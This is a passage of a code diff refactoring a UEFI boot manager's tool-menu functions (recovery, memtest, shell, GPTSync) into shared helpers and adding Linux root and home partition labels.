size as name\n+                    FileSystemInfoPtr = (Volume->RootDir != NULL)\n+                        ? LibFileSystemInfo (Volume->RootDir) : NULL;\n \n-                if (FoundName == NULL) {\n-                    FoundName = PoolPrint (L\"%s Volume\", TypeName);\n+                    if (FileSystemInfoPtr == NULL) {\n+                        FoundName = PoolPrint (L\"%s Volume\", TypeName);\n+                    }\n+                    else {\n+                        SISize    = SizeInIEEEUnits (FileSystemInfoPtr->VolumeSize);\n+                        FoundName = PoolPrint (L\"%s %s Volume\", SISize, TypeName);\n+                        MY_FREE_POOL(FileSystemInfoPtr);\n+                        MY_FREE_POOL(SISize);\n+                    }\n                 }\n             }\n         }\n\n@@ -3248,7 +3241,9 @@\nVOID ScanVolumes (VOID) {\n         else if (IsStriStr (Volume->VolName, L\"APFS/FileVault\"           )) RoleStr = L\"?* Type Entity-Container\";\n         else if (MyStriCmp (Volume->VolName, L\"Whole Disk Volume\"        )) RoleStr = L\" * Type Entity-WholeDisk\";\n         else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidESP        )) RoleStr = L\" * Part System EFI (ESP)\";\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLinux      )) RoleStr = L\" * Part Linux Filesystem\";\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLinux      )) RoleStr = L\" * Part Linux FileSystem\";\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &gRootGuid      )) RoleStr = L\" * Part Linux RootVolume\";\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidHome       )) RoleStr = L\" * Part Linux HomeVolume\";\n         else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidSwap       )) RoleStr = L\" * Part Linux SwapVolume\";\n         else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidBasicData  )) RoleStr = L\" * Type Volume-BasicData\";\n         else if (IsStriStr (Volume->VolName, L\"Optical Disc\"             )) RoleStr = L\" * Type Entity-OpticDisk\";\n```\n\nFilename: BootMaster/lib.h:\n```\n@@ -104,8 +104,6 @@\ntypedef struct {\n #   define NVRAM_EMULATED (NVRAM_TITLE L\" (Emulated)\")\n #endif\n \n-extern EFI_GUID gFreedesktopRootGuid;\n-\n INTN FindMem (\n     IN VOID  *Buffer,\n     IN UINTN  BufferLength,\n```\n\nFilename: BootMaster/main.c:\n```\n@@ -1895,24 +1895,123 @@\nBOOLEAN HandleExitShowInfo (VOID) {\n     return FALSE;\n } // static BOOLEAN HandleExitShowInfo()\n \n+static\n+REFIT_MENU_SCREEN * InitToolMenu (\n+    CHAR16            *ToolPurpose,\n+    CHAR16            *Title,\n+    UINTN              BuiltinIconID\n+) {\n+    REFIT_MENU_SCREEN *Menu;\n+\n+\n+    Menu = AllocateZeroPool (\n+        sizeof (REFIT_MENU_SCREEN)\n+    );\n+    if (Menu == NULL) {\n+        return NULL;\n+    }\n+\n+    #if REFIT_DEBUG > 0\n+    ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n+    ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n+    #endif\n+\n+    Menu->TitleImage = BuiltinIcon  (BuiltinIconID          );\n+    Menu->Title      = StrDuplicate (Title                  );\n+    Menu->Hint1      = StrDuplicate (SELECT_OPTION_HINT     );\n+    Menu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT);\n+\n+    return Menu;\n+} // static REFIT_MENU_SCREEN * InitToolMenu()\n+\n+static\n+VOID HandleToolMenu (\n+    REFIT_MENU_SCREEN **Menu,\n+    REFIT_MENU_ENTRY  **EntryItems,\n+    UINTN               EntryCount\n+) {\n+    UINTN               i;\n+    BOOLEAN             RetVal;\n+\n+\n+    if (EntryItems == NULL) {\n+        AddMenuInfoLine (*Menu, L\"Could *NOT* Find Valid Instance\", FALSE);\n+        AddMenuInfoLine (*Menu, L\"  Remove from 'showtools' List\",  FALSE);\n+        AddMenuInfoLine (*Menu, L\"\",                                FALSE);\n+    } else {\n+        for (i = 0; i < EntryCount; i++) {\n+            AddMenuEntry (\n+                *Menu, (REFIT_MENU_ENTRY *) EntryItems[i]\n+            );\n+        }\n+    }\n+\n+    RetVal = GetMenuEntryReturn (Menu);\n+    if (!RetVal) {\n+        FreeMenuScreen (Menu);\n+    }\n+} // static VOID HandleToolMenu()\n+\n+static\n+BOOLEAN HandleToolSelection (\n+    REFIT_MENU_SCREEN   *MenuScreen,\n+    LOADER_ENTRY       **ReturnEntryItem,\n+    LOADER_ENTRY      ***EntryItems\n+) {\n+    INTN                 DefaultEntry;\n+    UINTN                MenuExit;\n+    MENU_STYLE_FUNC      Style;\n+    REFIT_MENU_ENTRY    *ChosenOption;\n+\n+\n+    if (MenuScreen == NULL) {\n+        // Return 'FALSE'\n+        return HandleExitShowInfo();\n+    }\n+\n+    DefaultEntry = 9999; // Use the Max Index\n+    Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n+    MenuExit = DrawMenuScreen (\n+        MenuScreen, Style,\n+        &DefaultEntry, &ChosenOption\n+    );\n+\n+    #if REFIT_DEBUG > 0\n+    ALT_LOG(1, LOG_LINE_NORMAL,\n+        L\"Returned '%d' (%s) from Menu Screen Option ... \\\"%s\\\" in Function:- '%a'\",\n+        MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+    );\n+    LOG_MSG(\"\\n\\n\");\n+    LOG_MSG(\"Received User Input:\");\n+    LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n+    #endif\n+\n+    if (MenuExit != MENU_EXIT_ENTER ||\n+        ChosenOption->Tag != TAG_BASE\n+    ) {\n+        return FALSE;\n+    }\n+\n+    *ReturnEntryItem = CopyLoaderEntry (\n+        (*EntryItems)[ChosenOption->Row]\n+    );\n+\n+    return TRUE;\n+} // static BOOLEAN HandleToolSelection()\n+\n static\n BOOLEAN ShowInfoRecoveryMac (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    EFI_STATUS                Status;\n-    INTN                      DefaultEntry;\n-    UINTN                     i, j;\n-    UINTN                     MenuExit;\n-    UINTN                     TempSize;\n-    UINTN                     VolumeIndex;\n-    CHAR16                   *RecoverVol; // Do *NOT* Free\n-    CHAR16                   *FileName;\n-    BOOLEAN                   RetVal;\n-    REFIT_FILE               *TempFile;\n-    MENU_STYLE_FUNC           Style;\n-    LOADER_ENTRY             *MenuEntryItem;\n-    REFIT_MENU_ENTRY         *ChosenOption;\n+    EFI_STATUS                 Status;\n+    UINTN                      i, j;\n+    UINTN                      TempSize;\n+    UINTN                      VolumeIndex;\n+    CHAR16                    *RecoverVol; // Do *NOT* Free\n+    CHAR16                    *FileName;\n+    REFIT_FILE                *TempFile;\n+    LOADER_ENTRY              *MenuEntryItem;\n \n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n\n@@ -1923,30 +2022,25 @@\nBOOLEAN ShowInfoRecoveryMac (\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n+        if (RunOnce) break;\n \n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n-\n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_APPLE_RESCUE);\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_RECOVERY_MAC           );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT           );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT      );\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_RECOVERY_MAC,\n+            BUILTIN_ICON_TOOL_APPLE_RESCUE\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         i = 0;\n-        while ((FileName = FindCommaDelimited (GlobalConfig.MacOSRecoveryFiles, i++)) != NULL) {\n+        for (;;) {\n+            FileName = FindCommaDelimited (\n+                GlobalConfig.MacOSRecoveryFiles, i++\n+            );\n+            if (FileName == NULL) break;\n+\n             for (VolumeIndex = 0; VolumeIndex < RecoveryVolumesHFSCount; VolumeIndex++) {\n-                if ((RecoveryVolumesHFS[VolumeIndex]->RootDir != NULL)     &&\n-                    (IsValidTool (RecoveryVolumesHFS[VolumeIndex], FileName))\n+                if (RecoveryVolumesHFS[VolumeIndex]->RootDir != NULL &&\n+                    IsValidTool (RecoveryVolumesHFS[VolumeIndex], FileName)\n                 ) {\n                     Status = RefitReadFile (\n                         RecoveryVolumesHFS[VolumeIndex]->RootDir,\n\n@@ -1979,10 +2073,10 @@\nBOOLEAN ShowInfoRecoveryMac (\n                         );\n                     }\n                 } // if (RecoveryVolumesHFS[VolumeIndex]->RootDir\n-            } // for\n+            } // for VolumeIndex = 0\n \n             MY_FREE_POOL(FileName);\n-        } // while\n+        } // for ;;\n \n \n // DA-TAG: Limit to TianoCore\n\n@@ -2007,9 +2101,8 @@\nBOOLEAN ShowInfoRecoveryMac (\n \n                     if (!SkipSystemVolume) {\n                         if (GuidsAreEqual (\n-                                &(RecoveryVolumesAPFS[i]->PartGuid),\n-                                &(SystemVolumes[j]->PartGuid)\n-                            )\n+                            &(RecoveryVolumesAPFS[i]->PartGuid),\n+                            &(SystemVolumes[j]->PartGuid))\n                         ) {\n                             if (SystemVolumes[j]->VolRole == APFS_VOLUME_ROLE_SYSTEM ||\n                                 SystemVolumes[j]->VolRole == APFS_VOLUME_ROLE_UNDEFINED\n\n@@ -2048,107 +2141,54 @@\nBOOLEAN ShowInfoRecoveryMac (\n // DA-TAG: Limit to TianoCore\n #endif\n \n-        if (RecoveryMacEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < RecoveryMacEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) RecoveryMacEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) RecoveryMacEntryItems,\n+            RecoveryMacEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                RecoveryMacEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &RecoveryMacEntryItems\n+    );\n } // static BOOLEAN ShowInfoRecoveryMac()\n \n static\n BOOLEAN ShowInfoRecoveryWin (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n     UINTN                      i, j;\n     UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n     CHAR16                    *RecoverVol;\n     CHAR16                    *FileName;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n     LOADER_ENTRY              *MenuEntryItem;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n \n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_WINDOWS_RESCUE);\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_RECOVERY_WIN             );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT             );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT        );\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_RECOVERY_WIN,\n+            BUILTIN_ICON_TOOL_WINDOWS_RESCUE\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         for (i = 0; i < RecoveryWinEntryItemsCount; i++) {\n             j = 0;\n-            while ((FileName = FindCommaDelimited (GlobalConfig.WindowsRecoveryFiles, j++)) != NULL) {\n+            for (;;) {\n+                FileName = FindCommaDelimited (\n+                    GlobalConfig.WindowsRecoveryFiles, j++\n+                );\n+                if (FileName == NULL) break;\n+\n                 SplitVolumeAndFilename (&FileName, &RecoverVol);\n                 for (VolumeIndex = 0; VolumeIndex < VolumesCount; VolumeIndex++) {\n                     if (Volumes[VolumeIndex]->RootDir != NULL        &&\n\n@@ -2184,107 +2224,48 @@\nBOOLEAN ShowInfoRecoveryWin (\n                             );\n                         }\n                     } // if Volumes[VolumeIndex]->RootDir\n-                } // for\n+                } // for VolumeIndex = 0\n \n                 MY_FREE_POOL(RecoverVol);\n                 MY_FREE_POOL(FileName);\n-            } // while\n-        } // for\n-\n-        if (RecoveryWinEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < RecoveryWinEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) RecoveryWinEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n+            } // for ;;\n+        } // for i = 0\n \n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) RecoveryWinEntryItems,\n+            RecoveryWinEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                RecoveryWinEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &RecoveryWinEntryItems\n+    );\n } // static BOOLEAN ShowInfoRecoveryWin()\n \n static\n BOOLEAN ShowInfoMemTest (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n     CHAR16                    *ToolLoc;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n \n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_MEMTEST);\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_MEMTEST           );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT      );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT );\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_MEMTEST,\n+            BUILTIN_ICON_TOOL_MEMTEST\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         ToolLoc = StrDuplicate (SelfDirPath);\n         MergeStrings (\n\n@@ -2307,62 +2288,19 @@\nBOOLEAN ShowInfoMemTest (\n         );\n         MY_FREE_POOL(ToolLoc);\n \n-        if (MemTestEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < MemTestEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) MemTestEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) MemTestEntryItems,\n+            MemTestEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                MemTestEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &MemTestEntryItems\n+    );\n } // static BOOLEAN ShowInfoMemTest()\n \n static\n\n@@ -2374,36 +2312,19 @@\nBOOLEAN ShowInfoShell (\n     BOOLEAN CheckMute = FALSE;\n     #endif\n \n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_SHELL );\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_SHELL            );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT     );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT);\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_SHELL,\n+            BUILTIN_ICON_TOOL_SHELL\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, SHELL_FILES,\n\n@@ -2423,562 +2344,219 @@\nBOOLEAN ShowInfoShell (\n         MY_MUTELOGGER_OFF;\n         #endif\n \n-        if (ShellEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < ShellEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) ShellEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) ShellEntryItems,\n+            ShellEntryItemsCount\n+        );\n     } while (0); // This 'loop' only runs once\n \n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n-        );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                ShellEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n-\n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &ShellEntryItems\n+    );\n } // static BOOLEAN ShowInfoShell()\n \n static\n BOOLEAN ShowInfoGPTSync (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_PART  );\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_GPTSYNC          );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT     );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT);\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_GPTSYNC,\n+            BUILTIN_ICON_TOOL_PART\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, GPTSYNC_FILES,\n             ToolPurpose, BUILTIN_ICON_TOOL_PART,\n             TRUE, FALSE, TAG_GPTSYNC\n         );\n \n-        if (GPTSyncEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < GPTSyncEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) GPTSyncEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) GPTSyncEntryItems,\n+            GPTSyncEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                GPTSyncEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        